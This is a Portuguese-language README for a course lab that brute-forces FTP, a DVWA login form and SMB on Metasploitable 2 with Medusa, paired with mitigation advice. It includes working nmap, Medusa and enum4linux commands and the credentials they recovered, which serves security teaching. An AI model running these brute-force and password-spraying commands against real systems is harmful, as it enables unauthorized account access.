# Desafio-DIO-Ciberseguranca1
Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

# 🔐 Laboratório de Força Bruta com Kali Linux e Medusa

## 📌 Descrição

Este projeto foi desenvolvido como parte do desafio prático da DIO com o objetivo de demonstrar, em ambiente controlado, ataques de força bruta utilizando o Kali Linux e a ferramenta Medusa contra serviços vulneráveis disponibilizados pela máquina Metasploitable 2 e pela aplicação DVWA (Damn Vulnerable Web Application).

O laboratório foi realizado exclusivamente para fins educacionais e de aprendizado em cibersegurança ofensiva e defensiva.

---

## ⚠️ Aviso Legal

> Todos os testes apresentados neste repositório foram realizados em ambiente controlado e autorizado, utilizando máquinas vulneráveis destinadas para estudo.
>
> Este conteúdo possui finalidade exclusivamente educacional.

---

# 🎯 Objetivos do Projeto

- Compreender ataques de força bruta em diferentes serviços;
- Utilizar o Kali Linux para auditoria de segurança;
- Explorar o uso da ferramenta Medusa;
- Identificar vulnerabilidades comuns relacionadas a autenticação;
- Aplicar conceitos básicos de enumeração de usuários;
- Documentar processos técnicos de forma clara e estruturada;
- Demonstrar medidas de mitigação e boas práticas de segurança.

---

# 🖥️ Ambiente Utilizado

## Máquinas Virtuais

| Máquina | Função |
|---|---|
| Kali Linux | Máquina atacante |
| Metasploitable 2 | Máquina vulnerável |

## Virtualização

- VirtualBox

## Configuração de Rede

As duas máquinas foram configuradas utilizando o modo:

```bash
Host-Only Adapter
```

Essa configuração permitiu comunicação isolada entre as VMs sem exposição à internet externa.

---

# 🛠️ Ferramentas Utilizadas

- Kali Linux
- Medusa
- Nmap
- Enum4Linux
- FTP
- SMB
- DVWA
- Apache2
- VirtualBox

---

# 🌐 Descoberta de Serviços

Inicialmente foi realizado um processo de enumeração para identificar os serviços ativos na máquina alvo.

## Comando Utilizado

```bash
nmap -sV 192.168.56.101
```

## Resultado Obtido

```bash
21/tcp   open  ftp        vsftpd 2.3.4
80/tcp   open  http       Apache httpd
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

## Análise

Foi possível identificar:

- Serviço FTP ativo;
- Servidor Web Apache;
- Serviços SMB expostos;
- Aplicação DVWA disponível via HTTP.

---

# 📂 Estrutura das Wordlists

Foram criadas wordlists simples para simular ataques básicos de autenticação.

## users.txt

```txt
msfadmin
admin
root
user
guest
```

## passwords.txt

```txt
123456
password
admin
root
msfadmin
qwerty
```

---

# 🔓 Cenário 1 — Ataque de Força Bruta em FTP

## Objetivo

Validar a exposição do serviço FTP a ataques de autenticação por força bruta.

---

## Execução do Ataque

### Comando Utilizado

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
```

---

## Resultado Obtido

```bash
ACCOUNT FOUND:
[ftp] Host: 192.168.56.101
User: msfadmin
Password: msfadmin
```

---

## Validação do Acesso

Após a descoberta da credencial válida, foi realizado acesso ao serviço FTP.

### Comando

```bash
ftp 192.168.56.101
```

### Login

```bash
Name: msfadmin
Password: msfadmin
```

### Resultado

A autenticação foi concluída com sucesso.

---

## Vulnerabilidades Identificadas

- Uso de credenciais fracas;
- Ausência de MFA;
- Ausência de bloqueio por tentativas;
- Serviço FTP legado exposto.

---

## Medidas de Mitigação

- Implementar política de senhas fortes;
- Desabilitar FTP não seguro;
- Utilizar SFTP;
- Aplicar Fail2Ban;
- Implementar autenticação multifator;
- Configurar limitação de tentativas.

---

# 🌐 Cenário 2 — Automação de Tentativas em Formulário Web (DVWA)

## Objetivo

Simular ataque de força bruta contra formulário web vulnerável utilizando DVWA.

---

## Acesso ao DVWA

URL utilizada:

```txt
http://192.168.56.101/dvwa
```

## Credenciais padrão

```txt
Usuário: admin
Senha: password
```

---

## Configuração de Segurança

No painel do DVWA foi configurado:

```txt
DVWA Security = Low
```

---

## Execução do Ataque

### Comando Utilizado

```bash
medusa -h 192.168.56.101 \
-u admin \
-P passwords.txt \
-M http \
-m DIR:/dvwa/login.php \
-m FORM:"username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

## Resultado Obtido

```bash
ACCOUNT FOUND:
[http] Host: 192.168.56.101
User: admin
Password: password
```

---

## Vulnerabilidades Identificadas

- Login sem proteção contra brute force;
- Credenciais previsíveis;
- Ausência de CAPTCHA;
- Ausência de rate limiting.

---

## Medidas de Mitigação

- Implementar rate limiting;
- Utilizar CAPTCHA;
- Adotar MFA;
- Implementar WAF;
- Monitorar tentativas suspeitas;
- Aplicar políticas de senha segura.

---

# 🖧 Cenário 3 — Password Spraying em SMB

## Objetivo

Realizar enumeração de usuários SMB e testar técnica de password spraying.

---

# 🔎 Enumeração de Usuários

## Comando Utilizado

```bash
enum4linux -U 192.168.56.101
```

---

## Usuários Encontrados

```txt
root
daemon
msfadmin
service
postgres
user
```

---

# 🔐 Execução do Password Spraying

Foi utilizada uma senha comum para testar múltiplos usuários.

## Comando Utilizado

```bash
medusa -h 192.168.56.101 \
-U users.txt \
-p password \
-M smbnt
```

---

## Resultado Obtido

```bash
ACCOUNT FOUND:
[smbnt] Host: 192.168.56.101
User: user
Password: password
```

---

# 🚨 Vulnerabilidades Identificadas

- Senhas fracas;
- Reutilização de senha;
- Enumeração de usuários habilitada;
- SMB exposto desnecessariamente.

---

# 🛡️ Medidas de Mitigação

- Desabilitar SMBv1;
- Restringir compartilhamentos;
- Implementar bloqueio de conta;
- Utilizar política forte de senhas;
- Restringir enumeração SMB;
- Aplicar monitoramento contínuo.

---

# 📸 Evidências

As capturas de tela do laboratório podem ser organizadas na pasta:

```txt
/images
```

Sugestões de imagens:

- Configuração da rede no VirtualBox;
- Resultado do Nmap;
- Execução do Medusa;
- Login FTP realizado;
- DVWA configurado;
- Enumeração SMB;
- Resultados do password spraying.

---

# 📚 Aprendizados

Durante o desenvolvimento deste laboratório foi possível compreender:

- Como ataques de força bruta funcionam na prática;
- A importância de políticas seguras de autenticação;
- O impacto de credenciais fracas;
- Como ferramentas de auditoria podem ser utilizadas em testes controlados;
- A importância de monitoramento e mitigação de tentativas de acesso indevido.

Além disso, o projeto reforçou conhecimentos sobre enumeração de serviços, autenticação em aplicações web e protocolos de rede vulneráveis.

---

# 🔒 Considerações de Segurança

Ferramentas ofensivas devem ser utilizadas exclusivamente:

- Em ambientes autorizados;
- Para fins educacionais;
- Em laboratórios controlados;
- Em auditorias com consentimento explícito.

O uso indevido dessas técnicas pode violar leis e políticas de segurança.

---

# 📁 Estrutura do Repositório

```txt
dio-medusa-bruteforce-lab/
│
├── README.md
├── wordlists/
│   ├── users.txt
│   └── passwords.txt
│
├── images/
│   ├── ftp-attack.png
│   ├── dvwa-test.png
│   ├── smb-test.png
│   └── nmap-scan.png
│
└── docs/
    └── mitigacoes.md
```

---

# 🚀 Conclusão

Este laboratório permitiu explorar cenários reais de autenticação insegura utilizando ferramentas amplamente empregadas em auditorias de segurança.

A atividade demonstrou como serviços mal configurados e senhas fracas podem comprometer sistemas inteiros, reforçando a importância de controles defensivos adequados.

O projeto também contribuiu para o desenvolvimento prático em:

- Reconhecimento de vulnerabilidades;
- Auditoria de segurança;
- Hardening de serviços;
- Documentação técnica;
- Uso de ferramentas ofensivas em ambiente controlado.

---

# 👨‍💻 Autor

Projeto desenvolvido para fins educacionais como parte do desafio da DIO.

---
